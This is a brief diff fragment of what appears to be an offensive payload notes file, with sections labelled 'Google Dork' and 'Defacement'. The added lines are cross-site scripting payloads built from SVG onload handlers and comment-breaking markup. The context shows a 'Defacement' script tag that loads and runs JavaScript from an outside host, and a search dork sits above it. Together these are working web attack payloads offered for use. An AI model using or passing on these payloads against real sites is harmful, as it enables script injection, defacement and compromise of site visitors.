@@ -3,6 +3,8 @@ Google Dork:
 ===========
 site:*.google.com -inurl:/
 
+<!--><svg onload=alert(1)-->.asp<svg onload=alert(document.domain)>
+
 Defacement:
 ==========
 <script src="https://xss0r.com/Resources/xss0r.js"></script>
